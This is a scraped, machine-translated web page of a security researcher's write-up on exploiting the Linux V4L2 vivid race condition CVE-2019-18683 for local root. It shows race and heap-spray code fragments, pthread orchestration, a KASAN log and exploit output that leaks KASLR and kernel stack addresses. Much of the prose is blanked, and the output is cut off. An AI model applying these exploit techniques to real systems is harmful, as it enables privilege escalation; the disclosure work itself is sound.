<!doctype html>
<html class="no-js" lang="ja">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👩‍🎨 🔱 🥘 CVE-2019-18683：Linux V4L2サブシステムの脆弱性の悪用 🍸 💕 🕹️</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="この記事では、2019年の終わりに発見して修正したLinuxカーネルの脆弱性CVE-2019-18683の悪用について説明します。指定されたCVE識別子は、「競合状態」タイプのいくつかの同様のエラーに割り当てられており、V4L2Linuxカーネルサブシステムに5年間存在しています。 2月15日、Of...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>CVE-2019-18683：Linux V4L2サブシステムの脆弱性の悪用</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pt/blog/491756/"><p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">この記事では、</font><font style="vertical-align: inherit;">2019年の終わりに発見して修正したLinuxカーネル</font><font style="vertical-align: inherit;">の脆弱性</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CVE-2019-18683</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">の悪用について説明し</font><font style="vertical-align: inherit;">ます。指定されたCVE識別子は、「競合状態」タイプのいくつかの同様のエラーに割り当てられており、</font></font><code>V4L2</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linuxカーネル</font><font style="vertical-align: inherit;">サブシステム</font><font style="vertical-align: inherit;">に5年間</font><font style="vertical-align: inherit;">存在して</font><font style="vertical-align: inherit;">います。 2月15日、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">OffensiveCon 2020</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">カンファレンスでこのトピックに関するプレゼンテーションを行いました</font><font style="vertical-align: inherit;">（</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">プレゼンテーションへのリンク</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）。</font></font></p><br>
<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">次に、私がマイクロアーキテクチャ用に開発したプロトタイプエクスプロイト（PoCエクスプロイト）がどのように機能するかを詳しく説明します</font></font><code>x86_64</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">このエクスプロイトは、核ストリームのコンテキストからローカル権限昇格を実行します。ユーザーストリームのマッピングはありません。</font><font style="vertical-align: inherit;">記事にも以下の対策を講じるバイパスのUbuntu Serverの18.04のために活用する方法を示しています</font></font><code>KASLR</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><code>SMEP</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">と</font></font><code>SMAP</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></p><br>
<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">まず、エクスプロイトがどのように機能するかを示すことから始めましょう。</font></font></p><br>
<p><img src="https://habrastorage.org/webt/vt/lj/fi/vtljfid4eunc_37k0zverpugslg.jpeg"></p><a name="habracut"></a><br>
<p><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">デモ探索ビデオ：</font></font></a></p><br>
<iframe width="560" height="315" src="https://www.youtube.com/embed/mb4YHyLy0Zc" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>
<br>
<h2 id="uyazvimosti"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脆弱性</font></font></h2><br>
<p> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">CVE-2019-18683</a>          <code>vivid</code>  <code>V4L2</code> (<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><code>drivers/media/platform/vivid</code></a>).      -   .      Ubuntu, Debian, Arch Linux, SUSE Linux Enterprise  openSUSE     (<code>CONFIG_VIDEO_VIVID=m</code>).</p><br>
<p> <code>vivid</code>   ,   <code>video4linux</code>:    ,       .     <code>vivid</code>-    .           ,    <code>V4L2</code>.     <code>vivid</code>   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">  Linux</a>.</p><br>
<p> Ubuntu <code>vivid</code>-   ,   Ubuntu    RW ACL     :</p><br>
<pre><code class="plaintext hljs">  a13x@ubuntu_server_1804:~$ getfacl /dev/video0<font></font>
  getfacl: Removing leading '/' from absolute path names<font></font>
  # file: dev/video0<font></font>
  # owner: root<font></font>
  # group: video<font></font>
  user::rw-<font></font>
  user:a13x:rw-<font></font>
  group::rw-<font></font>
  mask::rw-<font></font>
  other::---</code></pre><br>
<p>  (  ?),           .    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">CVE-2019-18683</a>.        Linux      <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="> </a> (full disclosure).</p><br>
<h2 id="oshibki-i-ispravleniya">  </h2><br>
<p>      <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">syzkaller</a>   .    .    (kernel log)   KASAN      (use-after-free)         <code>vid_cap_buf_queue()</code>.          .     <strong>  </strong>       <code>vivid_stop_generating_vid_cap()</code>, <code>vivid_stop_generating_vid_out()</code>  <code>sdr_cap_stop_streaming()</code>.      ,      <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">CVE-2019-18683</a>.</p><br>
<p>     .      <code>vivid_dev.mutex</code>     .               ,        .     <code>vivid_stop_generating_vid_cap()</code>:</p><br>
<pre><code class="plaintext hljs">    /* shutdown control thread */<font></font>
    vivid_grab_controls(dev, false);<font></font>
    mutex_unlock(&amp;dev-&gt;mutex);<font></font>
    kthread_stop(dev-&gt;kthread_vid_cap);<font></font>
    dev-&gt;kthread_vid_cap = NULL;<font></font>
    mutex_lock(&amp;dev-&gt;mutex);</code></pre><br>
<p>            (<code>kthread</code>),    ,   <code>vb2_fop_read()</code>       .      : <code>vb2_fop_read()</code>    <code>V4L2</code>,         ,     .</p><br>
<p>         :</p><br>
<ol>
<li><p>      .      <code>vivid_stop_generating_vid_cap()</code>,    : <br>
</p><br>
<pre><code class="diff hljs">    /* shutdown control thread */<font></font>
    vivid_grab_controls(dev, false);<font></font>
<span class="hljs-deletion">-   mutex_unlock(&amp;dev-&gt;mutex);</span><font></font>
    kthread_stop(dev-&gt;kthread_vid_cap);<font></font>
    dev-&gt;kthread_vid_cap = NULL;<font></font>
<span class="hljs-deletion">-   mutex_lock(&amp;dev-&gt;mutex);</span></code></pre><br>
</li>
<li><p> <code>mutex_trylock()</code>  <code>schedule_timeout_uninterruptible()</code>     .  , <code>vivid_thread_vid_cap()</code>   : <br>
</p><br>
<pre><code class="diff hljs">    for (;;) {<font></font>
            try_to_freeze();<font></font>
            if (kthread_should_stop())<font></font>
                    break;<font></font>
<span class="hljs-deletion">-           mutex_lock(&amp;dev-&gt;mutex);</span>
<span class="hljs-addition">+           if (!mutex_trylock(&amp;dev-&gt;mutex)) {</span>
<span class="hljs-addition">+                   schedule_timeout_uninterruptible(1);</span>
<span class="hljs-addition">+                   continue;</span>
<span class="hljs-addition">+           }</span><font></font>
            ...<font></font>
    }</code></pre><br>
</li>
</ol><br>
<p>   ?   ,  <code>kthread</code> ,      ,          ,    .       ,    <code>kthread</code>     ,        <code>kthread_stop()</code>   .  ,  <code>kthread</code>     ( , lockless).</p><br>
<h2 id="zasnut-byvaet-ne-tak-prosto">    </h2><br>
<p>          (      Linux Security Summit  ).    <code>security@kernel.org</code>    ,   ,     (   PoC crasher).</p><br>
<p>        (!).     (  ).         ,   «»     - .</p><br>
<p>     <code>kthread</code>       :</p><br>
<pre><code class="plaintext hljs">    if (!mutex_trylock(&amp;dev-&gt;mutex))<font></font>
        continue;</code></pre><br>
<p>  , ,   ,    –   (busy-loop),      (deadlock)      .     <code>crasher</code>  ,    <code>CONFIG_PREEMPT_NONE=y</code>.  ,       ,   .</p><br>
<p>      ,  <code>kthread</code>  :</p><br>
<pre><code class="plaintext hljs">    if (!mutex_trylock(&amp;dev-&gt;mutex)) {<font></font>
        schedule_timeout_interruptible(1);<font></font>
        continue;<font></font>
    }</code></pre><br>
<p>   <code>schedule_timeout_interruptible()</code>       <code>vivid-kthread-cap.c</code>.        <code>schedule_timeout()</code>   ,         .   ,    <code>PoC crasher</code>     .</p><br>
<p>   ,          ,  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="></a> :</p><br>
<pre><code class="plaintext hljs">I just realized that this too is wrong. It _works_, but because it<font></font>
doesn't actually set the task state to anything particular before<font></font>
scheduling, it's basically pointless. It calls the scheduler, but it<font></font>
won't delay anything, because the task stays runnable.<font></font>
<font></font>
So what you presumably want to use is either "cond_resched()" (to make<font></font>
sure others get to run with no delay) or<font></font>
"schedule_timeout_uninterruptible(1)" which actually sets the process<font></font>
state to TASK_UNINTERRUPTIBLE.<font></font>
<font></font>
The above works, but it's basically nonsensical.</code></pre><br>
<p> ,          .       ,     ,   <code>TASK_RUNNING</code>.         .</p><br>
<p>        ,        API.  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="></a>     Linux ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="></a>   (Steven Rostedt),        Linux.   ,             .</p><br>
<p>   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="> </a>  <code>schedule_timeout()</code>,         API.      <code>linux-next</code>.</p><br>
<p>      :)</p><br>
<p>    .</p><br>
<h2 id="vyigrat-gonku"> </h2><br>
<p>   ,  <code>vivid_stop_generating_vid_cap()</code>    ,      .      ,   <code>vivid_thread_vid_cap()</code>      ,     .             .</p><br>
<p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="> </a>,        .        , , :</p><br>
<ul>
<li> <code>vivid</code> ;</li>
<li>   ,  <code>/dev/video0</code> –    (<code>V4L2</code> capture device);</li>
<li>   (login)  ,  Ubuntu  RW ACL,   .</li>
</ul><br>
<p>    .       ,     CPU   <code>sched_setaffinity</code>:</p><br>
<pre><code class="plaintext hljs">    cpu_set_t single_cpu;<font></font>
<font></font>
    CPU_ZERO(&amp;single_cpu);<font></font>
    CPU_SET(cpu_n, &amp;single_cpu);<font></font>
    ret = sched_setaffinity(0, sizeof(single_cpu), &amp;single_cpu);<font></font>
    if (ret != 0)<font></font>
        err_exit("[-] sched_setaffinity for a single CPU");</code></pre><br>
<p> ,      (    ):</p><br>
<pre><code class="plaintext hljs">    for (loop = 0; loop &lt; LOOP_N; loop++) {<font></font>
        int fd = 0;<font></font>
<font></font>
        fd = open("/dev/video0", O_RDWR);<font></font>
        if (fd &lt; 0)<font></font>
            err_exit("[-] open /dev/video0");<font></font>
<font></font>
        read(fd, buf, 0xfffded);<font></font>
        close(fd);<font></font>
    }</code></pre><br>
<p> <code>vid_cap_start_streaming()</code>,   ,   <code>V4L2</code>   <code>vb2_core_streamon()</code>       .</p><br>
<p> <code>vivid_stop_generating_vid_cap()</code>,   ,   <code>V4L2</code>   <code>__vb2_queue_cancel()</code>      .</p><br>
<p>        ,  ,    <code>vb2_core_qbuf()</code>    <code>V4L2</code>    <code>vb2_queue.queued_list</code>  <code>vb2_buffer</code>.    ,      .</p><br>
<h2 id="obmanutaya-podsistema-v4l2">  V4L2</h2><br>
<p>    .  <code>V4L2</code>   <code>vb2_core_queue_release()</code>,     .       <code>__vb2_queue_free()</code>,    <code>vb2_buffer</code>,      .</p><br>
<p>  <code>vivid</code>            .          ,   .     KASAN:</p><br>
<div class="spoiler"><b class="spoiler_title"> KASAN</b><div class="spoiler_text"><pre><code class="plaintext hljs"> ==================================================================<font></font>
 BUG: KASAN: use-after-free in vid_cap_buf_queue+0x188/0x1c0<font></font>
 Write of size 8 at addr ffff8880798223a0 by task v4l2-crasher/300<font></font>
<font></font>
 CPU: 1 PID: 300 Comm: v4l2-crasher Tainted: G        W         5.4.0-rc2+ #3<font></font>
 Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS ?-20190727_073836-buildvm-ppc64le-16.ppc.fedoraproject.org-3.fc31 04/01/2014<font></font>
 Call Trace:<font></font>
  dump_stack+0x5b/0x90<font></font>
  print_address_description.constprop.0+0x16/0x200<font></font>
  ? vid_cap_buf_queue+0x188/0x1c0<font></font>
  ? vid_cap_buf_queue+0x188/0x1c0<font></font>
  __kasan_report.cold+0x1a/0x41<font></font>
  ? vid_cap_buf_queue+0x188/0x1c0<font></font>
  kasan_report+0xe/0x20<font></font>
  vid_cap_buf_queue+0x188/0x1c0<font></font>
  vb2_start_streaming+0x222/0x460<font></font>
  vb2_core_streamon+0x111/0x240<font></font>
  __vb2_init_fileio+0x816/0xa30<font></font>
  __vb2_perform_fileio+0xa88/0x1120<font></font>
  ? kmsg_dump_rewind_nolock+0xd4/0xd4<font></font>
  ? vb2_thread_start+0x300/0x300<font></font>
  ? __mutex_lock_interruptible_slowpath+0x10/0x10<font></font>
  vb2_fop_read+0x249/0x3e0<font></font>
  v4l2_read+0x1bf/0x240<font></font>
  vfs_read+0xf6/0x2d0<font></font>
  ksys_read+0xe8/0x1c0<font></font>
  ? kernel_write+0x120/0x120<font></font>
  ? __ia32_sys_nanosleep_time32+0x1c0/0x1c0<font></font>
  ? do_user_addr_fault+0x433/0x8d0<font></font>
  do_syscall_64+0x89/0x2e0<font></font>
  ? prepare_exit_to_usermode+0xec/0x190<font></font>
  entry_SYSCALL_64_after_hwframe+0x44/0xa9<font></font>
 RIP: 0033:0x7f3a8ec8222d<font></font>
 Code: c1 20 00 00 75 10 b8 00 00 00 00 0f 05 48 3d 01 f0 ff ff 73 31 c3 48 83 ec 08 e8 4e fc ff ff 48 89 04 24 b8 00 00 00 00 0f 05 &lt;48&gt; 8b 3c 24 48 89 c2 e8 97 fc ff ff 48 89 d0 48 83 c4 08 48 3d 01<font></font>
 RSP: 002b:00007f3a8d0d0e80 EFLAGS: 00000293 ORIG_RAX: 0000000000000000<font></font>
 RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f3a8ec8222d<font></font>
 RDX: 0000000000fffded RSI: 00007f3a8d8d3000 RDI: 0000000000000003<font></font>
 RBP: 00007f3a8d0d0f50 R08: 0000000000000001 R09: 0000000000000026<font></font>
 R10: 000000000000060e R11: 0000000000000293 R12: 00007ffc8d26495e<font></font>
 R13: 00007ffc8d26495f R14: 00007f3a8c8d1000 R15: 0000000000000003<font></font>
<font></font>
 Allocated by task 299:<font></font>
  save_stack+0x1b/0x80<font></font>
  __kasan_kmalloc.constprop.0+0xc2/0xd0<font></font>
  __vb2_queue_alloc+0xd9/0xf20<font></font>
  vb2_core_reqbufs+0x569/0xb10<font></font>
  __vb2_init_fileio+0x359/0xa30<font></font>
  __vb2_perform_fileio+0xa88/0x1120<font></font>
  vb2_fop_read+0x249/0x3e0<font></font>
  v4l2_read+0x1bf/0x240<font></font>
  vfs_read+0xf6/0x2d0<font></font>
  ksys_read+0xe8/0x1c0<font></font>
  do_syscall_64+0x89/0x2e0<font></font>
  entry_SYSCALL_64_after_hwframe+0x44/0xa9<font></font>
<font></font>
 Freed by task 300:<font></font>
  save_stack+0x1b/0x80<font></font>
  __kasan_slab_free+0x12c/0x170<font></font>
  kfree+0x90/0x240<font></font>
  __vb2_queue_free+0x686/0x7b0<font></font>
  vb2_core_reqbufs.cold+0x1d/0x8a<font></font>
  __vb2_cleanup_fileio+0xe9/0x140<font></font>
  vb2_core_queue_release+0x12/0x70<font></font>
  _vb2_fop_release+0x20d/0x290<font></font>
  v4l2_release+0x295/0x330<font></font>
  __fput+0x245/0x780<font></font>
  task_work_run+0x126/0x1b0<font></font>
  exit_to_usermode_loop+0x102/0x120<font></font>
  do_syscall_64+0x234/0x2e0<font></font>
  entry_SYSCALL_64_after_hwframe+0x44/0xa9<font></font>
<font></font>
 The buggy address belongs to the object at ffff888079822000<font></font>
  which belongs to the cache kmalloc-1k of size 1024<font></font>
 The buggy address is located 928 bytes inside of<font></font>
  1024-byte region [ffff888079822000, ffff888079822400)<font></font>
 The buggy address belongs to the page:<font></font>
 page:ffffea0001e60800 refcount:1 mapcount:0 mapping:ffff88802dc03180 index:0xffff888079827800 compound_mapcount: 0<font></font>
 flags: 0x500000000010200(slab|head)<font></font>
 raw: 0500000000010200 ffffea0001e77c00 0000000200000002 ffff88802dc03180<font></font>
 raw: ffff888079827800 000000008010000c 00000001ffffffff 0000000000000000<font></font>
 page dumped because: kasan: bad access detected<font></font>
<font></font>
 Memory state around the buggy address:<font></font>
  ffff888079822280: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb<font></font>
  ffff888079822300: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb<font></font>
 &gt;ffff888079822380: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb<font></font>
                                ^<font></font>
  ffff888079822400: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc<font></font>
  ffff888079822480: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc<font></font>
 ==================================================================</code></pre></div></div><br>
<p>      KASAN,         <code>kmalloc-1k</code>  .        ,         ,    .    <code>heap spraying</code>  .</p><br>
<h2 id="heap-spraying">Heap spraying</h2><br>
<p><code>Heap spraying</code> –   ,            (heap).                    ,    .</p><br>
<p>  Linux  slab-   :  <code>kmalloc()</code>       slab-,     (    ).     <code>heap spraying</code>      :              ,    .     :</p><br>
<p><img src="https://habrastorage.org/getpro/habr/post_images/876/c74/b84/876c74b84cf1d3750c45fea6e819a5ff.png" alt="解放後の利用"></p><br>
<p> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="> </a>  ,              Linux.     <code>userfaultfd()</code>  <code>setxattr()</code>.       ,     .     ,  <code>userfaultfd()</code>      ,       <code>setxattr()</code>.        CVE-2019-18683.</p><br>
<p>   , <code>vb2_buffer</code>       ,    .      : <code>heap spraying</code>        !     : <code>__vb2_queue_free()</code>   <code>vb2_buffer</code>   .  ,  <code>kmalloc()</code>    .    <code>setxattr()</code>    ,    ,     «».</p><br>
<p>       : ,  <code>setxattr()</code> <strong></strong>   ,   <code>userfaultfd()</code>   <code>UFFDIO_COPY</code> ioctl.  ,        ,  ioctl    .        –     (pthreads)   <code>heap spraying</code>.    <code>setxattr()</code>   <code>userfaultfd()</code>  .  ,    CPU    <code>sched_setaffinity()</code>  ,        slab- (  CPU   slab-).</p><br>
<p>     ,      <code>vb2_buffer</code>.        .</p><br>
<h2 id="perehvat-potoka-ispolneniya-v-podsisteme-v4l2">     V4L2</h2><br>
<p><code>V4L2</code> –     Linux.     <code>Video for Linux version 2</code>.      ,    <code>V4L2</code> (    ).</p><br>
<br>
<img src="https://habrastorage.org/getpro/habr/post_images/e4d/8bf/d1f/e4d8bfd1f4e408a5ebe08a021c0367c8.png"><br>
<br>
<p>         <code>vb2_buffer</code>,       -  <code>V4L2</code>,      .  ,         (arbitrary write)   <code>vb2_buffer.planes</code>.</p><br>
<p>      ,   : <code>vb2_buffer.vb2_queue-&gt;mem_ops-&gt;vaddr</code>.       :      <code>void *</code>.  ,   <code>vaddr()</code> ,  <code>vb2_buffer.planes[0].mem_priv</code>,   ,     .</p><br>
<h2 id="nepredvidennye-slozhnosti-kontekst-yadernogo-potoka"> :   </h2><br>
<p> <code>vb2_mem_ops.vaddr</code>,     <code>vb2_buffer</code>,      <code>V4L2</code>,     .</p><br>
<p>         : <code>SMAP</code> (Supervisor Mode Access Prevention), <code>SMEP</code> (Supervisor Mode Execution Prevention)  <code>KPTI</code> (Kernel Page-Table Isolation).   ,   <code>vb2_buffer.vb2_queue</code>       ,    <code>mmap()</code>.     : <code>unable to handle page fault</code>. ,          (kthread context),      .</p><br>
<p> ,       :    <code>vb2_queue</code>  <code>vb2_mem_ops</code>     ,       .</p><br>
<h2 id="ideya"></h2><br>
<p>          Linux,      .   ,        (kernel warning)  <code>V4L2</code>    .      <code>__vb2_queue_cancel()</code>,    :</p><br>
<pre><code class="plaintext hljs">    /*<font></font>
     * If you see this warning, then the driver isn't cleaning up properly<font></font>
     * in stop_streaming(). See the stop_streaming() documentation in<font></font>
     * videobuf2-core.h for more information how buffers should be returned<font></font>
     * to vb2 in stop_streaming().<font></font>
     */<font></font>
    if (WARN_ON(atomic_read(&amp;q-&gt;owned_by_drv_count))) {</code></pre><br>
<p> ,   -        (      Ubuntu Server).    ,    .          <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="> </a> (<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">xairy</a>),     .      – <code>            userfaultfd(),    </code>.         ,         <code>copy_from_user()</code>.   ,   ,     <strong> xairy</strong>,    .</p><br>
<p>  ,  ,                  .         .       , ?</p><br>
<p>,      .       <code>SMAP</code>, <code>SMEP</code>  <code>KASLR</code>  Ubuntu Server 18.04.</p><br>
<h2 id="eksployt-orkestr">-</h2><br>
<p>         (pthreads),        (<code>pthread_barriers</code>).   ,       :</p><br>
<pre><code class="plaintext hljs">#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)<font></font>
<font></font>
#define THREADS_N 50<font></font>
<font></font>
    pthread_barrier_t barrier_prepare;<font></font>
    pthread_barrier_t barrier_race;<font></font>
    pthread_barrier_t barrier_parse;<font></font>
    pthread_barrier_t barrier_kstack;<font></font>
    pthread_barrier_t barrier_spray;<font></font>
    pthread_barrier_t barrier_fatality;<font></font>
<font></font>
    ...<font></font>
<font></font>
    ret = pthread_barrier_init(&amp;barrier_prepare, NULL, THREADS_N - 3);<font></font>
    if (ret != 0)<font></font>
        err_exit("[-] pthread_barrier_init");<font></font>
<font></font>
    ret = pthread_barrier_init(&amp;barrier_race, NULL, 2);<font></font>
    if (ret != 0)<font></font>
        err_exit("[-] pthread_barrier_init");<font></font>
<font></font>
    ret = pthread_barrier_init(&amp;barrier_parse, NULL, 3);<font></font>
    if (ret != 0)<font></font>
        err_exit("[-] pthread_barrier_init");<font></font>
<font></font>
    ret = pthread_barrier_init(&amp;barrier_kstack, NULL, 3);<font></font>
    if (ret != 0)<font></font>
        err_exit("[-] pthread_barrier_init");<font></font>
<font></font>
    ret = pthread_barrier_init(&amp;barrier_spray, NULL, THREADS_N - 5);<font></font>
    if (ret != 0)<font></font>
        err_exit("[-] pthread_barrier_init");<font></font>
<font></font>
    ret = pthread_barrier_init(&amp;barrier_fatality, NULL, 2);<font></font>
    if (ret != 0)<font></font>
        err_exit("[-] pthread_barrier_init");</code></pre><br>
<p>    <strong>50  (pthreads)</strong>,     <strong>   </strong>:</p><br>
<ul>
<li>2 <code>racer</code>-    ;</li>
<li>(THREADS_N — 6) = 44 <code>sprayer</code>-,    <code>setxattr()</code>   <code>userfaultfd()</code>,</li>
<li>2      <code>userfaultfd()</code>;</li>
<li>1    <code>/dev/kmsg</code>       ;</li>
<li>1 <code>fatality</code>-,       .</li>
</ul><br>
<p>,   ,     .    <code>pthread_barrier_init()</code>   ,  <strong>  </strong>    (   <code>pthread_barrier_wait()</code>)  ,     . ,      «-»:</p><br>
<img src="https://habrastorage.org/getpro/habr/post_images/627/549/d5c/627549d5c57a099257178d3b4529075b.png" alt="画像ソース：https://singletothemax.files.wordpress.com/2011/02/symphony_099_cropped1.jpg"><br>
<br>
<p>     ,         <code>pthread_barrier_wait()</code>.         .     ,   ,     .</p><br>
<img src="https://habrastorage.org/getpro/habr/post_images/e68/e73/7dc/e68e737dc9f94caaa58cc158d394aba9.png"><br>
<br>
<p>   ,    ,    :</p><br>
<div class="spoiler"><b class="spoiler_title">  </b><div class="spoiler_text"><pre><code class="plaintext hljs">a13x@ubuntu_server_1804:~$ uname -a<font></font>
Linux ubuntu_server_1804 4.15.0-66-generic #75-Ubuntu SMP Tue Oct 1 05:24:09 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux<font></font>
a13x@ubuntu_server_1804:~$ <font></font>
a13x@ubuntu_server_1804:~$ ./v4l2-pwn <font></font>
begin as: uid=1000, euid=1000<font></font>
Prepare the payload:<font></font>
 [+] payload for_heap is mmaped to 0x7f8c9e9b0000<font></font>
 [+] vivid_buffer of size 504 is at 0x7f8c9e9b0e08<font></font>
 [+] payload for_stack is mmaped to 0x7f8c9e9ae000<font></font>
 [+] timex of size 208 is at 0x7f8c9e9aef38<font></font>
 [+] userfaultfd #1 is configured: start 0x7f8c9e9b1000, len 0x1000<font></font>
 [+] userfaultfd #2 is configured: start 0x7f8c9e9af000, len 0x1000<font></font>
We have 4 CPUs for racing; now create 50 pthreads...<font></font>
 [+] racer 1 is ready on CPU 1<font></font>
 [+] fatality is ready<font></font>
 [+] racer 0 is ready on CPU 0<font></font>
 [+] fault_handler for uffd 3 is ready<font></font>
 [+] kmsg parser is ready<font></font>
 [+] fault_handler for uffd 4 is ready<font></font>
 [+] 44 sprayers are ready (passed the barrier)<font></font>
Racer 1: GO!<font></font>
Racer 0: GO!<font></font>
 [+] found rsp "ffffb93600eefd60" in kmsg<font></font>
 [+] kernel stack top is 0xffffb93600ef0000<font></font>
 [+] found r11 "ffffffff9d15d80d" in kmsg<font></font>
 [+] kaslr_offset is 0x1a800000<font></font>
Adapt payloads knowing that kstack is 0xffffb93600ef0000, kaslr_offset 0x1a800000:<font></font>
   vb2_queue of size 560 will be at 0xffffb93600eefe30, userspace 0x7f8c9e9aef38<font></font>
   mem_ops ptr will be at 0xffffb93600eefe68, userspace 0x7f8c9e9aef70, value 0xffffb93600eefe70<font></font>
   mem_ops struct of size 120 will be at 0xffffb93600eefe70, userspace 0x7f8c9e9aef78, vaddr 0xffffffff9bc725f1 at 0x7f8c9e9aefd0<font></font>
   rop chain will be at 0xffffb93600eefe80, userspace 0x7f8c9e9aef88<font></font>
   cmd will be at ffffb93600eefedc, userspace 0x7f8c9e9aefe4<font></font>
 [+] the payload for kernel heap and stack is ready. Put it.<font></font>
 [+] UFFD_EVENT_PAGEFAULT for uffd 4 on address = 0x7f8c9e9af000: 2 faults collected<font></font>
 [+] fault_handler for uffd 4 passed the barrier<font></font>
 [+] UFFD_EVENT_PAGEFAULT for uffd 3 on address = 0x7f8c9e9b1000: 44 faults collected<font></font>
